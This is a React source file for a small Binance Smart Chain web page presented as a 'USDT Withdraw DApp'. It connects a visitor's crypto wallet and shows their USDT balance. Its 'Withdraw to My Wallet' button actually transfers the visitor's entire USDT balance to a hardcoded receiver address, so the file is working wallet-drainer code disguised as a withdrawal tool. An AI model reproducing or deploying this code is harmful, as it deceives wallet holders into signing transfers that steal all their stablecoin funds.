import React, { useState } from "react";
import { ethers } from "ethers";

// ✅ Official USDT Contract on BSC
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

// ✅ Minimal ERC20 ABI (balance + transfer + decimals)
const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 value) returns (bool)",
  "function decimals() view returns (uint8)"
];

// ✅ Your wallet to receive withdrawals
const RECEIVER_WALLET = "0x45e0c5af78c5ff0ff61cba8eb5a35507a31d5d6c";

function App() {
  const [account, setAccount] = useState(null);
  const [balance, setBalance] = useState("0");

  // 🔹 Connect wallet + force BSC
  const connectWallet = async () => {
    if (!window.ethereum) {
      alert("Please install Trust Wallet or MetaMask!");
      return;
    }

    try {
      // Request account connection
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      setAccount(accounts[0]);

      // Force switch to BSC
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Mainnet
      });

      loadBalance(accounts[0]);
    } catch (err) {
      // If BSC not added, add it
      if (err.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: "0x38",
            chainName: "Binance Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com/"],
          }],
        });
      } else {
        console.error("Error connecting:", err);
      }
    }
  };

  // 🔹 Load USDT balance
  const loadBalance = async (userAddress) => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
    const decimals = await usdt.decimals();
    const rawBalance = await usdt.balanceOf(userAddress);
    setBalance(ethers.utils.formatUnits(rawBalance, decimals));
  };

  // 🔹 Withdraw USDT
  const withdrawUSDT = async () => {
    if (!account) {
      alert("Connect wallet first!");
      return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);

    try {
      const decimals = await usdt.decimals();
      const rawBalance = await usdt.balanceOf(account);

      if (rawBalance.eq(0)) {
        alert("You have 0 USDT");
        return;
      }

      // Send ALL USDT to your wallet
      const tx = await usdt.transfer(RECEIVER_WALLET, rawBalance);
      alert("Transaction submitted: " + tx.hash);

      await tx.wait();
      alert("✅ Withdraw complete!");
      loadBalance(account);
    } catch (err) {
      console.error("Withdraw failed:", err);
      alert("Withdraw failed: " + err.message);
    }
  };

  return (
    <div className="App" style={{ padding: "20px", textAlign: "center" }}>
      <h1>USDT Withdraw DApp (BSC Only)</h1>

      {!account ? (
        <button onClick={connectWallet}>Connect Wallet</button>
      ) : (
        <>
          <p><b>Connected:</b> {account}</p>
          <p><b>USDT Balance:</b> {balance}</p>
          <button onClick={withdrawUSDT}>Withdraw to My Wallet</button>
        </>
      )}
    </div>
  );
}

export default App;
